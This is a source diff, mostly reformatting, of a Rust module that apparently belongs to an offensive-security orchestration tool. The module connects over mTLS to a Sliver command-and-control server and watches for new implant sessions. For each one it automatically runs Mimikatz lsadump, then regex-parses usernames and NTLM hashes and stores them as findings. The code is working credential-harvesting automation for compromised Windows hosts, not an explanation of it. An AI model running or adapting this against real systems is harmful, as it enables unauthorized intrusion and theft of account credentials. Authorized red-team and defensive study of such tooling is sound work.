@@ -1,18 +1,23 @@
+use crate::core::orchestrator::c2::sliver_proto::sliver::commonpb::{
+    Empty, Request as CommonRequest,
+};
 use crate::core::orchestrator::c2::sliver_proto::sliver::rpcpb::sliver_rpc_client::SliverRpcClient;
-use crate::core::orchestrator::c2::sliver_proto::sliver::commonpb::{Empty, Request as CommonRequest};
-use crate::core::orchestrator::c2::sliver_proto::sliver::sliverpb::{CallExtensionReq, CallExtension};
-use crate::models::{Finding, Category, Severity};
+use crate::core::orchestrator::c2::sliver_proto::sliver::sliverpb::{
+    CallExtension, CallExtensionReq,
+};
 use crate::core::orchestrator::swarm::inventory::SwarmInventory;
-use std::sync::Arc;
-use tracing::{info, error};
-use tokio_stream::StreamExt;
-use tonic::transport::{Certificate, Identity, ClientTlsConfig, Channel};
+use crate::models::{Category, Finding, Severity};
+use async_trait::async_trait;
 use once_cell::sync::Lazy;
 use regex::Regex;
+use std::sync::Arc;
 use std::time::Duration;
-use async_trait::async_trait;
+use tokio_stream::StreamExt;
+use tonic::transport::{Certificate, Channel, ClientTlsConfig, Identity};
+use tracing::{error, info};
 
-static RE_NTLM: Lazy<Regex> = Lazy::new(|| Regex::new(r"(?i)Hash NTLM\s*:\s*([a-f0-9]{32})").unwrap());
+static RE_NTLM: Lazy<Regex> =
+    Lazy::new(|| Regex::new(r"(?i)Hash NTLM\s*:\s*([a-f0-9]{32})").unwrap());
 static RE_USER: Lazy<Regex> = Lazy::new(|| Regex::new(r"(?i)User\s*:\s*([^\r\n]+)").unwrap());
 
 // ---------------------------------------------------------------------------
@@ -62,7 +67,12 @@ impl SliverFeedbackLoop {
         } else {
             None
         };
-        Self { server_addr, inventory, ca_cert, client_identity }
+        Self {
+            server_addr,
+            inventory,
+            ca_cert,
+            client_identity,
+        }
     }
 
     /// Start the background feedback loop.
@@ -81,7 +91,10 @@ impl SliverFeedbackLoop {
                     backoff = Duration::from_secs(1);
                 }
                 Err(e) => {
-                    error!("SliverFeedbackLoop: error: {}. Retrying in {:?}...", e, backoff);
+                    error!(
+                        "SliverFeedbackLoop: error: {}. Retrying in {:?}...",
+                        e, backoff
+                    );
                     tokio::time::sleep(backoff).await;
                     backoff = std::cmp::min(backoff * 2, max_backoff);
                 }
@@ -93,8 +106,7 @@ impl SliverFeedbackLoop {
         let mut endpoint = Channel::from_shared(self.server_addr.clone())?;
 
         if let Some(ca) = &self.ca_cert {
-            let mut tls_config = ClientTlsConfig::new()
-                .ca_certificate(Certificate::from_pem(ca));
+            let mut tls_config = ClientTlsConfig::new().ca_certificate(Certificate::from_pem(ca));
             if let Some((cert, key)) = &self.client_identity {
                 tls_config = tls_config.identity(Identity::from_pem(cert, key));
             }
@@ -106,18 +118,27 @@ impl SliverFeedbackLoop {
 
         info!("SliverFeedbackLoop: connected via mTLS. Subscribing to events...");
 
-        let mut stream = client.events(tonic::Request::new(Empty::default())).await?.into_inner();
+        let mut stream = client
+            .events(tonic::Request::new(Empty::default()))
+            .await?
+            .into_inner();
 
         while let Some(event_res) = stream.next().await {
             match event_res {
                 Ok(event) => {
                     if let Some(session) = event.session {
-                        info!("🎯 SliverFeedbackLoop: New Session — ID: {} Host: {}", session.id, session.hostname);
+                        info!(
+                            "🎯 SliverFeedbackLoop: New Session — ID: {} Host: {}",
+                            session.id, session.hostname
+                        );
                         let inventory_clone = self.inventory.clone();
                         let client_clone = client.clone();
                         let session_id = session.id.clone();
                         tokio::spawn(async move {
-                            if let Err(e) = Self::handle_new_session(client_clone, session_id, inventory_clone).await {
+                            if let Err(e) =
+                                Self::handle_new_session(client_clone, session_id, inventory_clone)
+                                    .await
+                            {
                                 error!("SliverFeedbackLoop: session handler error: {}", e);
                             }
                         });
@@ -138,7 +159,10 @@ impl SliverFeedbackLoop {
         session_id: String,
         inventory: Arc<SwarmInventory>,
     ) -> anyhow::Result<()> {
-        info!("SliverFeedbackLoop: running lsadump on session {}", session_id);
+        info!(
+            "SliverFeedbackLoop: running lsadump on session {}",
+            session_id
+        );
 
         // Build request — session_id MUST be present for the server to route correctly.
         let req = CallExtensionReq {
@@ -154,7 +178,10 @@ impl SliverFeedbackLoop {
         let response = client.call_extension(req).await?;
         let output = String::from_utf8_lossy(&response.output);
 
-        info!("SliverFeedbackLoop: Mimikatz done for {}. Parsing...", session_id);
+        info!(
+            "SliverFeedbackLoop: Mimikatz done for {}. Parsing...",
+            session_id
+        );
 
         for (user, hash) in Self::parse_mimikatz_output(&output) {
             info!("🔱 Credential extracted — user: {} hash: {}", user, hash);
@@ -162,7 +189,10 @@ impl SliverFeedbackLoop {
                 crate::models::constants::FINDING_NTLM_HASH_CAPTURED,
                 Category::CredentialLeak,
                 Severity::High,
-                &format!("NTLM hash for '{}' recovered via Mimikatz on session {}.", user, session_id),
+                &format!(
+                    "NTLM hash for '{}' recovered via Mimikatz on session {}.",
+                    user, session_id
+                ),
                 serde_json::json!({
                     "username": user,
                     "ntlm":     hash,
@@ -170,7 +200,10 @@ impl SliverFeedbackLoop {
                 }),
             );
             f.core.scope_id = "Auto-Inferred".to_string();
-            inventory.ingest_finding(f, crate::core::orchestrator::swarm::inventory::TrustLevel::Private);
+            inventory.ingest_finding(
+                f,
+                crate::core::orchestrator::swarm::inventory::TrustLevel::Private,
+            );
         }
 
         Ok(())
@@ -184,11 +217,16 @@ impl SliverFeedbackLoop {
         for line in output.lines() {
             if let Some(caps) = RE_USER.captures(line) {
                 current_user = Some(
-                    caps.get(1).map(|m| m.as_str().trim().to_string()).unwrap_or_default(),
+                    caps.get(1)
+                        .map(|m| m.as_str().trim().to_string())
+                        .unwrap_or_default(),
                 );
             } else if let Some(caps) = RE_NTLM.captures(line) {
                 if let Some(user) = current_user.take() {
-                    let hash = caps.get(1).map(|m| m.as_str().trim().to_string()).unwrap_or_default();
+                    let hash = caps
+                        .get(1)
+                        .map(|m| m.as_str().trim().to_string())
+                        .unwrap_or_default();
                     results.push((user, hash));
                 }
             }
